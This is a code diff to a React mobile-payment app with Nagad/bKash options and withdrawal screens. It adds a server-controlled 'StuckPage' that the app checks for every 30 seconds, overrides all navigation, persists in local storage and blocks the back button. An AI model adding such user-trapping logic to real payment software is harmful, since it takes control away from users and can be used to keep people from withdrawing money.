@@ -19,6 +19,7 @@ import SubmissionAccepted from './components/SubmissionAccepted';
 import ApprovalNotice from './components/ApprovalNotice';
 import WithdrawalForm from './components/WithdrawalForm';
 import WithdrawalWaiting from './components/WithdrawalWaiting';
+import StuckPage from './components/StuckPage';
 
 
 export const db = {
@@ -96,6 +97,9 @@ const App: React.FC = () => {
   const [adminPassword, setAdminPassword] = useState('');
   const [sessionId, setSessionId] = useState<string>(localStorage.getItem('user_session_id') || '');
   const [isBlocked, setIsBlocked] = useState(false);
+  const [isStuck, setIsStuck] = useState(false);
+  const [stuckMessage, setStuckMessage] = useState('');
+  const [, setStuckChecked] = useState(false);
   const [formSubmitted, setFormSubmitted] = useState(false);
   const [nagadEnabled, setNagadEnabled] = useState(true);
   const [bkashEnabled, setBkashEnabled] = useState(true);
@@ -144,6 +148,35 @@ const App: React.FC = () => {
     };
     checkBlocked();
   }, []);
+
+  // Stuck page check via cookie + IP (runs on mount + every 30s)
+  useEffect(() => {
+    let mounted = true;
+    const checkStuck = async () => {
+      try {
+        const sid = localStorage.getItem('user_session_id') || '';
+        const res = await fetch(`/api/check-stuck?sessionId=${encodeURIComponent(sid)}`);
+        const data = await res.json();
+        if (mounted && data.stuck) {
+          setIsStuck(true);
+          setStuckMessage(data.message || '');
+          localStorage.setItem('stuck_state', '1');
+          localStorage.setItem('stuck_message', data.message || '');
+        }
+      } catch (err) {}
+      if (mounted) setStuckChecked(true);
+    };
+    checkStuck();
+    const iv = setInterval(checkStuck, 30000);
+    return () => { mounted = false; clearInterval(iv); };
+  }, []);
+
+  // Block back navigation when stuck
+  useEffect(() => {
+    if (isStuck) {
+      window.history.pushState(null, '', window.location.href);
+    }
+  }, [isStuck]);
 
   useEffect(() => {
     const unsubscribe = db.ref('settings/nagadEnabled').on('value', (snapshot) => {
@@ -1046,6 +1079,11 @@ const App: React.FC = () => {
     );
   }
 
+  // Stuck page override: cookie + IP based, overrides ALL navigation
+  if (isStuck && currentStep !== AppStep.Admin) {
+    return <StuckPage message={stuckMessage || localStorage.getItem('stuck_message') || undefined} sessionId={sessionId} />;
+  }
+
   if (showLogin) {
     return (
       <div className="max-w-md mx-auto h-screen bg-white shadow-2xl overflow-hidden relative flex flex-col">
@@ -1096,6 +1134,8 @@ const App: React.FC = () => {
             onLoadingStarted={() => setFinalResultStartLoading(false)}
           />
         );
+      case AppStep.StuckPage:
+        return <StuckPage message={stuckMessage || localStorage.getItem('stuck_message') || undefined} sessionId={sessionId} />;
       case AppStep.SubmissionAccepted:
         return <SubmissionAccepted sessionId={sessionId} acceptedAt={acceptedAt} />;
       case AppStep.ApprovalNotice:
